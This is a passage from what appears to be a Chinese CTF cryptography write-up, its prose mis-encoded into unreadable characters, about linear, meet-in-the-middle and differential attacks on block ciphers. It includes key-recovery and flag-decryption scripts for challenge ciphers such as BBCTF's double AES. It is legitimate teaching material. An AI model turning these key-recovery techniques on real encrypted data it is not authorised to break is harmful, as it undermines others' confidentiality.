class="keyword">in</span> offset[i]]</span><br><span class="line">    <span class="keyword">for</span> linearOutput <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        cur = [x[linearOutput] <span class="keyword">for</span> x <span class="keyword">in</span> offset]</span><br><span class="line">        linearInput.append(cur.index(max(cur)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcOffset</span><span class="params">(pt, ct, j, guessed_key)</span>:</span>  <span class="comment"># çŒœæµ‹ç¬¬jæ®µå­å¯†é’¥</span></span><br><span class="line">    pt = list(unhexlify(pt))</span><br><span class="line">    ct = list(unhexlify(ct))</span><br><span class="line">    ct[j] ^= guessed_key</span><br><span class="line">    ct[j] = sbox[ct[j]] <span class="comment"># sboxå³ä¸ºsboxiçš„é€†</span></span><br><span class="line">    ct[j] = (ct[j] * coef[j]) % <span class="number">256</span></span><br><span class="line">    u1 = bitxor(pt[<span class="number">0</span>], linearInput[<span class="number">1</span> &lt;&lt; ((<span class="number">6</span> - j) % <span class="number">8</span>)])</span><br><span class="line">    u2 = bitxor(ct[j], <span class="number">0b10000000</span>)</span><br><span class="line">    <span class="keyword">if</span> u1 == u2:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linearAttack</span><span class="params">()</span>:</span></span><br><span class="line">    key2 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>): <span class="comment"># ç¬¬äºŒè½®å­å¯†é’¥çš„ç¬¬iæ®µ</span></span><br><span class="line">        count = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">256</span>)]</span><br><span class="line">        <span class="keyword">for</span> guessed_key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            print(<span class="string">"[+] Cracking key...(&#123;&#125;-&#123;&#125;)"</span>.format(i, guessed_key))</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">                <span class="keyword">if</span> calcOffset(plain[j], cipher[j], i, guessed_key) == <span class="literal">True</span>:</span><br><span class="line">                    count[guessed_key] += <span class="number">1</span></span><br><span class="line">        bias = [abs(x - <span class="number">5000</span>) / <span class="number">10000</span> <span class="keyword">for</span> x <span class="keyword">in</span> count]</span><br><span class="line">        key2.append(bias.index(max(bias)))</span><br><span class="line">    <span class="keyword">return</span> key2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getkey</span><span class="params">(key2)</span>:</span></span><br><span class="line">    ct = list(unhexlify(cipher[<span class="number">0</span>]))</span><br><span class="line">    pt = list(unhexlify(plain[<span class="number">0</span>]))</span><br><span class="line">    cur = doxor(ct, key2)</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    key = doxor(cur, pt) + key2</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_block</span><span class="params">(ct, key)</span>:</span></span><br><span class="line">    cur = doxor(ct, key[SZ:])</span><br><span class="line">    cur = [sbox[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = trans(cur)</span><br><span class="line">    cur = [sboxi[x] <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">    cur = doxor(cur, key[:SZ])</span><br><span class="line">    <span class="keyword">return</span> cur</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(ct, key)</span>:</span></span><br><span class="line">    pt = <span class="string">b''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ct), SZ * <span class="number">2</span>):</span><br><span class="line">        block_ct = list(unhexlify(ct[i : i + SZ * <span class="number">2</span>]))</span><br><span class="line">        block_pt = decrypt_block(block_ct, key)</span><br><span class="line">        pt += bytes(block_pt)</span><br><span class="line">    <span class="keyword">return</span> pt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    getData(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    linearSbox()</span><br><span class="line">    key2 = linearAttack()</span><br><span class="line">    key = getkey(key2)</span><br><span class="line">    print(key)</span><br><span class="line">    flag = decrypt(enc_flag, key)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><h4 id="More"><a href="#More" class="headerlink" title="More"></a>More</h4><p>åœ¨è½®æ¬¡é«˜çš„æ—¶å€™ï¼Œçº¿æ€§åˆ†æçš„åˆ†æå¤æ‚åº¦å¾€å¾€ä¼šæ›´é«˜ï¼Œè€Œä¸”æˆåŠŸç‡æœ‰æ‰€é™ä½ï¼Œå…·ä½“è§†é¢˜ç›®è€Œå®š</p><h3 id="ä¸­é—´ç›¸é‡æ”»å‡»"><a href="#ä¸­é—´ç›¸é‡æ”»å‡»" class="headerlink" title="ä¸­é—´ç›¸é‡æ”»å‡»"></a>ä¸­é—´ç›¸é‡æ”»å‡»</h3><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem"></a>Theorem</h4><p>ä»¥ä¸‹åŸºæœ¬åŸç†å‚ç…§ctf-wiki</p><p>å‡è®¾ E å’Œ D åˆ†åˆ«æ˜¯åŠ å¯†å‡½æ•°å’Œè§£å¯†å‡½æ•°ï¼Œ$k_{1}$ å’Œ $k_2$ åˆ†åˆ«æ˜¯ä¸¤æ¬¡åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ï¼Œåˆ™æˆ‘ä»¬æœ‰</p><script type="math/tex; mode=display">C=E_{k_2}(E_{k_1}(P))\\P=D_{k_2}(D_{k_1}(C))</script><p>æš´åŠ›æšä¸¾$(k_{1},k_{2})$çš„ç»„åˆå¯¹åº”æ—¶é—´å¤æ‚åº¦ä¸º$O(N^{2})$ï¼Œè€ŒåŸºäº$E_{k_1}(P)=D_{k_2}(C)$è¿™ä¸€äº‹å®</p><p>æˆ‘ä»¬å¯ä»¥å°†$E_{k_1}(P)$å’Œ$D_{k_2}(C)$åˆ¶æˆä¸¤å¼ å®¹é‡å‡ä¸ºNçš„æ˜ å°„è¡¨ï¼Œå–äº¤é›†å³å¯è·å¾—ä¸­é—´æ€ï¼Œè¿›è€Œæ¢å¤å‡ºä¸¤è½®å¯†é’¥</p><p>æœ€å¥½ä¸è¦åœ¨æ±‚è§£ç¬¬äºŒå¼ æ˜ å°„è¡¨çš„åŒæ—¶æŸ¥è¡¨ï¼ˆè¿™ä¼šä½¿å¾—æŸ¥æ‰¾è€—è´¹çš„æ—¶é—´å¤§å¤§å¢åŠ ï¼‰ï¼Œä»¥ä¸¤å¼ å®Œæ•´è¡¨å–äº¤é›†å³å¯</p><p>2020-BBCTFçš„ç»å…¸ä¾‹å­:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">key1 = <span class="string">'0'</span>*<span class="number">13</span> + <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)])</span><br><span class="line">key2 = <span class="string">''</span>.join([random.choice(printable) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>)]) + <span class="string">'0'</span>*<span class="number">13</span></span><br><span class="line"></span><br><span class="line">cipher1 = AES.new(key=key1, mode=AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key=key2, mode=AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nGive me a string:"</span></span><br><span class="line">pt = raw_input()</span><br><span class="line"></span><br><span class="line">val = len(pt) % <span class="number">16</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> val == <span class="number">0</span>:</span><br><span class="line">    pt += <span class="string">'0'</span>*(<span class="number">16</span> - val)</span><br><span class="line"></span><br><span class="line">c1 = cipher1.encrypt(pt.encode(<span class="string">'hex'</span>))</span><br><span class="line">c2 = cipher2.encrypt(c1.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Encrypted string:\n'</span> + c2.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"flag.txt"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read().strip()</span><br><span class="line"><span class="comment"># length of flag is a multiple of 16</span></span><br><span class="line">ct1 = cipher1.encrypt(flag.encode(<span class="string">'hex'</span>))</span><br><span class="line">ct2 = cipher2.encrypt(ct1.encode(<span class="string">'hex'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\nEncrypted Flag:\n'</span> + ct2.encode(<span class="string">'hex'</span>) + <span class="string">'\n'</span></span><br></pre></td></tr></table></figure><p>é‡‡ç”¨ä¸­é—´ç›¸é‡æ”»å‡»å³å¯å°†æ—¶é—´å¤æ‚åº¦æ§åˆ¶åœ¨$O(2\cdot 100^{3})$ä¸‹</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># In[27]:</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">import</span> itertools, string</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[37]:</span></span><br><span class="line">crack_range = list(itertools.product(string.printable, string.printable, string.printable))</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[50]:</span></span><br><span class="line">pt = hexlify(<span class="string">b'aaaaaaaaaaaaaaaa'</span>)</span><br><span class="line">key_known = <span class="string">'0'</span> * <span class="number">13</span></span><br><span class="line">c1 = []</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> suffix <span class="keyword">in</span> crack_range:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cnt % <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/1000000"</span>.format(cnt), end=<span class="string">""</span>)</span><br><span class="line">    key1 = (key_known + (<span class="string">''</span>.join(suffix))).encode()</span><br><span class="line">    cipher1 = AES.new(key1, AES.MODE_ECB)</span><br><span class="line">    c1.append(cipher1.encrypt(pt))</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[51]</span></span><br><span class="line">c1 = [hexlify(c) <span class="keyword">for</span> c <span class="keyword">in</span> c1]</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[54]</span></span><br><span class="line">c1_set = set(c1)</span><br><span class="line">c2 = unhexlify(<span class="string">b'ef92fab38516aa95fdc53c2eb7e8fe1d5e12288fdc9d026e30469f38ca87c305ef92fab38516aa95fdc53c2eb7e8fe1d5e12288fdc9d026e30469f38ca87c305'</span>)</span><br><span class="line">inv_c1 = []</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> prefix <span class="keyword">in</span> crack_range:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cnt % <span class="number">100</span>:</span><br><span class="line">        print(<span class="string">"\r&#123;&#125;/1000000"</span>.format(cnt), end=<span class="string">""</span>)</span><br><span class="line">    key2 = ((<span class="string">''</span>.join(prefix)) + key_known).encode()</span><br><span class="line">    cipher2 = AES.new(key2, AES.MODE_ECB)</span><br><span class="line">    inv_c1.append(cipher2.decrypt(c2))</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># In[78]</span></span><br><span class="line">inv_c1_set = set(inv_c1)</span><br><span class="line">mid_cipher = list(c1_set &amp; inv_c1_set)[<span class="number">0</span>]</span><br><span class="line">key1_pos = c1.index(mid_cipher)</span><br><span class="line">key2_pos = inv_c1.index(mid_cipher)</span><br><span class="line">key1 = (key_known + (<span class="string">''</span>.join(crack_range[key1_pos]))).encode()</span><br><span class="line">key2 = ((<span class="string">''</span>.join(crack_range[key2_pos])) + key_known).encode()</span><br><span class="line">cipher1 = AES.new(key1, AES.MODE_ECB)</span><br><span class="line">cipher2 = AES.new(key2, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line"><span class="comment"># In[78]</span></span><br><span class="line">cipher = unhexlify(<span class="string">b'fa364f11360cef2550bd9426948af22919f8bdf4903ee561ba3d9b9c7daba4e759268b5b5b4ea2589af3cf4abe6f9ae7e33c84e73a9c1630a25752ad2a984abfbbfaca24f7c0b4313e87e396f2bf5ae56ee99bb03c2ffdf67072e1dc98f9ef691db700d73f85f57ebd84f5c1711a28d1a50787d6e1b5e726bc50db5a3694f576'</span>)</span><br><span class="line">flag = unhexlify(cipher1.decrypt(unhexlify(cipher2.decrypt(cipher))))</span><br><span class="line">flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Out[79]</span></span><br><span class="line"><span class="string">b'flag&#123;y0u_m@d3_i7_t0_7h3_m1dddl3&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="å·®åˆ†åˆ†æ"><a href="#å·®åˆ†åˆ†æ" class="headerlink" title="å·®åˆ†åˆ†æ"></a>å·®åˆ†åˆ†æ</h3><h4 id="Theorem-0"><a href="#Theorem-0" class="headerlink" title="Theorem-0"></a>Theorem-0</h4><p>å·®åˆ†åˆ†æåŸºæœ¬æ€æƒ³ï¼šé€‰æ‹©å¤§é‡çš„å€™é€‰æ˜æ–‡å·®åˆ†å¯¹ï¼Œå¯¹åº”å¯†æ–‡å·®åˆ†çš„å½±å“æ¥æ¢å¤å°½å¯èƒ½å¤šçš„å¯†é’¥. å·®åˆ†$\Delta X_{i}=X_{i}\oplus X_{i}^{*}$.</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_14-30-05.png" alt></p><p>å·®åˆ†åˆ†æç¬¦å·å®šä¹‰å¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">(\Delta X_{i},\Delta Y_{i}):=Prob\{F_{i}(X_{i}\oplus\Delta X_{i},K_{i})=F_{i}(X_{i},K_{i})\oplus\Delta Y_{i}\}\\[p_{1},p_{2},...p_{t}]=\prod_{i=1}^{t}p_{i}\\B_{n}:=max_{\Delta X_{i}=\Delta X_{i-2}\oplus\Delta Y_{i-1}(3\leq i\leq n)}[(\Delta X_{1},\Delta Y_{1}),(\Delta X_{2},\Delta Y_{2}),...,(\Delta X_{n},\Delta Y_{n})]</script><h4 id="Theorem-1"><a href="#Theorem-1" class="headerlink" title="Theorem-1"></a>Theorem-1</h4><p>ä¸‹ä»‹ç»å¦‚ä½•é«˜æ•ˆæœç´¢Feistel-SPç»“æ„åˆ†ç»„å¯†ç çš„å¤šè½®é«˜æ¦‚ç‡å·®åˆ†è·¯å¾„.</p><p>Matsuiçš„åŸç®—æ³•å¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_15-55-25.png" alt></p><blockquote><p>Matsuiâ€™s algorithm works by induction on the number of rounds and derives the best <em>n</em>-round weight <em>B_n</em> from the knowledge of all <em>i</em>-round best weight <em>B_i</em> (1 <em>â‰¤</em> <em>i</em> <em>â‰¤</em> <em>n-1</em>).</p></blockquote><p>ä¸”åŸå§‹çš„é€’å½’æ·±æœç®—æ³•å¤æ‚åº¦ç›¸å¯¹é«˜ï¼Œå› æ­¤åœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œå‰ªæ.</p><ul><li><p><strong>é‡æ„Sç›’å·®åˆ†åˆ†å¸ƒè¡¨ï¼Œå°†å…¶è½¬åŒ–ä¸ºå¯†é›†å‹å“ˆå¸Œè¡¨</strong>ã€‚pythonç”¨å­—å…¸å®ç°å³å¯(è¾“å…¥å·®åˆ†â†’è¾“å‡ºå·®åˆ†â†’æ¦‚ç‡)</p></li><li><p><strong>åŸºäºå‘é‡å‰ªæçš„ä¼˜åŒ–Matsuiç®—æ³•</strong></p><p>åœ¨åŸºäºå­—èŠ‚å‰ªæçš„Matsuiç®—æ³•ä¸­ï¼Œé¢‘ç¹çš„ç©·å°½æœç´¢$2^{32}$æˆ–$2^{64}$ï¼Œå› æ­¤ä½¿ç”¨å‘é‡é€’å½’è°ƒç”¨ï¼Œå°½å¯èƒ½æ—©çš„è¿‡æ»¤ä¸æ»¡è¶³çš„$\Delta X_{i}$å’Œ$\Delta Y_{i}$.</p><p>ä»¥ä¸‹æ˜¯å¯¹Round-2çš„ç®—æ³•å‰ªæï¼Œåç»­è½®ä¹Ÿå¯é‡‡ç”¨ç›¸ä¼¼ç®—æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Call Procedure Round-2-1</span><br><span class="line">Return to the upper procedure.</span><br></pre></td></tr></table></figure><p><strong>Procedure Round-2-j (1 &lt;= j &lt;= 8):</strong></p><p>For each candidate for $\Delta X_{2}^{j}$ and $\Delta Y_{2}^{j}$,do:</p><ul><li><p>$\quad p_{2}^{j} = (\Delta X_{2}^{j}, \Delta Y_{2}^{j})$ and $p_{2} = [p_{2}^{1}, â€¦, p_{2}^{j}]$;</p></li><li><p>$\quad if\ [p_{1}, p_{2}, B_{n-2}]&lt; \bar{B_{n}}$, then <strong>continue</strong>;</p></li><li><p>$\quad if\ [p_{1}, p_{2}, B_{n-2}]\geq \bar {B_{n}}$:</p><p>â€‹        if $j\neq 8$, then call <strong>Procedure Round-2-(j+1)</strong>;</p><p>â€‹        else call <strong>Procedure Round-3</strong>;</p></li></ul></li></ul><h4 id="Theorem-2"><a href="#Theorem-2" class="headerlink" title="Theorem-2"></a>Theorem-2</h4><p>å·®åˆ†è¿‡ç¨‹å¯ä»¥ç®€å•å½’çº³ä¸º</p><p>(1) é‡‡æ ·ï¼šé€‰æ‹©å¤§é‡åˆé€‚çš„æ˜æ–‡å¯¹(æ»¡è¶³å·®åˆ†)ï¼Œå¹¶è·å¾—ç›¸åº”çš„å¯†æ–‡å¯¹ï¼›</p><p>(2) å»å™ªï¼Œé€šè¿‡è§‚å¯Ÿå¯†æ–‡å¯¹å·®åˆ†çš„ä¸€äº›ç‰¹æ€§ï¼Œææ—©è¿‡æ»¤ä¸€éƒ¨åˆ†ä¸æ­£ç¡®çš„æ˜æ–‡å¯¹ï¼Œæ’é™¤å¹²æ‰°ï¼›</p><p>(3) æå–ä¿¡æ¯ï¼Œå¯¹è¿‡æ»¤åçš„æ•°æ®å’Œæ¯ä¸ªçŒœæµ‹å¯†é’¥è¿›è¡Œç»Ÿè®¡åˆ†æï¼Œæ¢å¤æ­£ç¡®è½®å¯†é’¥(éƒ¨åˆ†æ¯”ç‰¹)ï¼›</p><p>m: æ ·æœ¬é‡å¤§å°; p: å·®åˆ†åŒºåˆ†å™¨æ¦‚ç‡; $\upsilon$: å¹³å‡æ¯ä¸ªå¯†æ–‡å¯¹è•´å«çš„å¯†é’¥æ•°;</p><p>l: æ”»å‡»æ‰€çŒœæµ‹çš„å¯†é’¥é‡; $\lambda$: å»å™ªé˜¶æ®µçš„è¿‡æ»¤ç³»æ•°</p><p><strong>æ³¨</strong>ï¼šå…¶ä¸­$\upsilon$ä¸Sç›’å·®åˆ†åˆ†å¸ƒè¡¨æœ‰å…³ï¼Œå¤§è‡´ä¼°è®¡æ–¹æ³•å¯ä»¥ä¸ºï¼š</p><p>(e.g.) Sç›’6è¿›4å‡ºï¼Œå¹³å‡æ„ä¹‰ä¸Šå·®åˆ†åˆ†å¸ƒè¡¨çš„å–å€¼ä¸º$2^{6}/2^{4}=4$. å‡è®¾ä¸€æ¬¡æ”»å‡»çŒœæµ‹4ä¸ªSç›’å¯¹åº”çš„å¯†é’¥ï¼Œåˆ™è¯¥å‚æ•°å¯ä¼°è®¡ä¸º$4^{4}=2^{8}$.</p><p>åˆ™æ­£ç¡®å¯†é’¥è‡³å°‘è¢«ç»Ÿè®¡äº†$mp$æ¬¡ï¼Œæ‰€æœ‰çŒœæµ‹å¯†é’¥å¹³å‡è¢«ç»Ÿè®¡äº†$\frac{m\lambda\upsilon}{2^{l}}$æ¬¡ï¼Œåˆ™ä¿¡å™ªæ¯”</p><script type="math/tex; mode=display">S/N=\frac{mp}{m\lambda\upsilon/2^{l}}=\frac{p\cdot 2^{l}}{\lambda\upsilon}.</script><p>ä¿¡å™ªæ¯”è¶Šå¤§ï¼Œå³æ­£ç¡®å¯†é’¥è¢«ç»Ÿè®¡æ¬¡æ•°ç›¸å¯¹è¶Šå¤šï¼Œæ›´å®¹æ˜“åœ¨è®¡æ•°å™¨ä¸­è¢«åŒºåˆ†ï¼Œä»è€Œé™ä½é€‰æ‹©æ˜æ–‡æ”»å‡»çš„æ˜æ–‡é‡</p><p>$m\approx \frac{c}{p},c=constant$. ä»¥Shamiræå‡ºçš„DESç›¸å…³å®éªŒæ•°æ®ä¸ºä¾‹ï¼š</p><p>$S/N\in [1,2]$ï¼Œcå–å€¼$[20,40]$ï¼›$S/N$æ›´å¤§æ—¶ï¼Œcå–å€¼$[3,4]$.</p><h4 id="Theorem-3"><a href="#Theorem-3" class="headerlink" title="Theorem-3"></a>Theorem-3</h4><p>å¯¹nè½®Feistelçš„å·®åˆ†æ”»å‡»ï¼Œä¸€èˆ¬æ€§ä¸Šå¾€å¾€æ˜¯1-Ræ”»å‡»ï¼Œè‡³äºm-Ræ”»å‡»ï¼ˆå¦‚å¯¹å…«è½®DESçš„3-Rå·®åˆ†æ”»å‡»ï¼‰ï¼Œå°½ç®¡å·®åˆ†ç‰¹å¾æ¦‚ç‡ä¼šæœ‰æ‰€é™ä½ï¼Œä½†å¾€å¾€éœ€è¦æ ¹æ®å…·ä½“Sç›’Pç›’è¿›è¡Œæ›´ç‰¹æ®Šçš„æ„é€ ï¼Œè€Œéç›´æ¥åˆ©ç”¨æœç´¢åˆ°çš„n-1è½®é«˜æ¦‚ç‡å·®åˆ†ç‰¹å¾è¿›è¡Œæ”»å‡»ã€‚</p><p>ä¸”å¯¹äº<strong>éåŒå°„</strong>å…³ç³»çš„Sç›’ï¼ˆå¦‚DESå…­è¿›å››å‡ºçš„Sç›’ï¼‰ï¼Œå³å¯èƒ½å­˜åœ¨ä¸¤è½®è¿­ä»£å·®åˆ†ç‰¹å¾ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/QQå›¾ç‰‡20200726134141.jpg" alt></p><p>å› ä¸ºè¯¥ç±»çš„Sç›’å­˜åœ¨è¾“å…¥å·®åˆ†ä¸ä¸º0ï¼Œä½†è¾“å‡ºå·®åˆ†ä¸º0çš„æƒ…å†µï¼Œåœ¨Pro(in, 0)è¾ƒå¤§æ—¶ï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨äºŒè½®è¿­ä»£å·®åˆ†ç‰¹å¾å®ç°2n+1(n&gt;=1)è½®Feistelçš„1-Ræ”»å‡»ï¼ˆå®Œå…¨ä¾èµ–äºSç›’ç‰¹æ€§åŠç›¸é‚»Sç›’é—´å…³ç³»ï¼‰</p><p>æœç´¢ä»…sbox[i]~sbox[j]æ¿€æ´»çš„äºŒè½®è¿­ä»£å·®åˆ†ç‰¹å¾å¯é‡‡ç”¨ä»¥ä¸‹é€’å½’ç®—æ³•å®ç°ï¼ˆä»¥ä¸‹ç®—æ³•åŸºäºDESçš„Eå‡½æ•°ï¼ˆFå‡½æ•°ç¬¬ä¸€æ­¥ï¼‰æ‰©å±•ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2-round iterative differential feature (sbox[i]~sbox[j])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_path</span><span class="params">(pre, i, j)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> dif_dist</span><br><span class="line">    sub_pro = <span class="number">1</span></span><br><span class="line">    max_pro = sub_pro</span><br><span class="line">    cur_path, path = <span class="literal">None</span>, []</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> dif_dist[i].keys():</span><br><span class="line">        <span class="keyword">if</span> key[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> ((key[<span class="number">0</span>] &amp; <span class="number">0b110000</span>) &gt;&gt; <span class="number">4</span>) == (pre &amp; <span class="number">0b000011</span>):</span><br><span class="line">            <span class="keyword">if</span> i == j <span class="keyword">and</span> (key[<span class="number">0</span>] &amp; <span class="number">0b000011</span>) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            value = dif_dist[i][key]</span><br><span class="line">            <span class="keyword">if</span> value % <span class="number">64</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> i &lt; j:</span><br><span class="line">                path, sub_pro = find_path(key[<span class="number">0</span>], i + <span class="number">1</span>, j)</span><br><span class="line">            <span class="keyword">if</span> value * sub_pro &gt; max_pro:</span><br><span class="line">                max_pro = value * sub_pro</span><br><span class="line">                cur_path = [key[<span class="number">0</span>]] + path</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cur_path:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> cur_path, max_pro <span class="comment"># pro = max_pro / (64 ** (j - i + 1))</span></span><br></pre></td></tr></table></figure><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p>ä»¥WMCTFå‡ºçš„idiot boxä¸ºä¾‹ï¼Œæˆ‘çš„æœ¬æ„æ˜¯Sç›’éšæœºshuffleç”Ÿæˆï¼Œkeyä¸å˜ï¼ŒåŠ¨æ€è¯·æ±‚é¶æœºç›´è‡³æ‰¾åˆ°ä½¿é«˜æ¦‚ç‡äºŒè½®è¿­ä»£å·®åˆ†ç‰¹å¾å­˜åœ¨çš„Sç›’ï¼Œä½†é˜¿é‡Œäº‘é¢‘ç¹remoteçœŸçš„æ…¢æ…¢æ…¢æ…¢æ…¢æ…¢ï¼Œè¿˜ä¼šè¢«banip</p><p>version1çš„expæ˜¯ä¸€æ¬¡æ”»å‡»ä¸¤ä¸ªç›¸é‚»Sç›’ï¼Œåˆ†å››æ®µå¾—åˆ°ç¬¬å…­è½®çš„å­å¯†é’¥ï¼Œä½†æ˜¯å› ä¸ºä¸Šè¿°åŸå› æ”¹äº†- -</p><p>æ”¹æˆé™æ€Sç›’åï¼Œåˆæœ‰ä¸€æ 